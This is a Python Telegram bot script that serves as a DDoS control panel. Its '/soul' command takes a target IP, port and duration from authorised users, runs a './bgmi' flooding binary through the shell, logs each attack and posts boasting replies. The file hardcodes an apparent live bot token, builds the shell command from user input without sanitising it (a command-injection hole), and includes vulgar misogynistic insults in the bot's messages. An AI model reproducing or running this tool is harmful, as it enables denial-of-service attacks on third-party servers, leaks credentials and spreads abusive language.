import telebot import subprocess import datetime import os import time

Insert your Telegram bot token here

bot = telebot.TeleBot('7377110679:AAGkV9D-tE-O2FBC6UjI9QtQRz9qm7DyWN0')

Admin user IDs

admin_id = {"80", "1174779637", "12345667"}

USER_FILE = "users1.txt" LOG_FILE = "log1.txt"

def log_command(user_id, king, soulking, duration): user_info = bot.get_chat(user_id) username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}" with open(LOG_FILE, "a") as file: file.write(f"Username: {username}\nTarget: {king}\nPort: {soulking}\nTime: {duration} Seconds\nTimestamp: {datetime.datetime.now()}\n\n")

def start_attack_reply(message, king, soulking, duration): user_info = message.from_user username = user_info.username if user_info.username else user_info.first_name response = (f"{username}, ✅🔥 𝘾𝙊𝙉𝙂𝙍𝘼𝙏𝙐𝙇𝘼𝙏𝙄𝙊𝙉𝙎 🔥✅\n\n" f"𝐓𝐚𝐫𝐠𝐞𝐭: {king}\n𝐏𝐨𝐫𝐭: {soulking}\n𝐓𝐢𝐦𝐞: {duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n" f"𝐌𝐞𝐭𝐡𝐨𝐝: soul\n\n🌟 DDOS LAGADO OFFICIAL..!💀") bot.reply_to(message, response)

def time_check(message, duration): for remaining in range(duration, 0, -10): bot.reply_to(message, f"⏳ Time left: {remaining} seconds") time.sleep(10) bot.reply_to(message, "🔥 loda bur mai ghusna ka liya phir sa tayar hai 🔥")

def finish_attack_message(message): bot.reply_to(message, "🔥 lode bur mai ghusna ka liya tayar hai ma aut beti dono ka 🔥")

@bot.message_handler(commands=['soul']) def handle_soul(message): user_id = str(message.chat.id) if user_id in admin_id: command = message.text.split() if len(command) == 4: king = command[1] soulking = int(command[2]) duration = int(command[3])

if duration > 180:
            bot.reply_to(message, "Error: Time interval must be less than 180.")
        else:
            log_command(user_id, king, soulking, duration)
            start_attack_reply(message, king, soulking, duration)
            full_command = f"./bgmi {king} {soulking} {duration}"
            subprocess.Popen(full_command, shell=True)
            
            time_check(message, duration)
            finish_attack_message(message)
    else:
        bot.reply_to(message, "Invalid command format. Use: /soul <target> <port> <time>")
else:
    bot.reply_to(message, "❌ You are not authorized to use this command.")

bot.polling(none_stop=True)




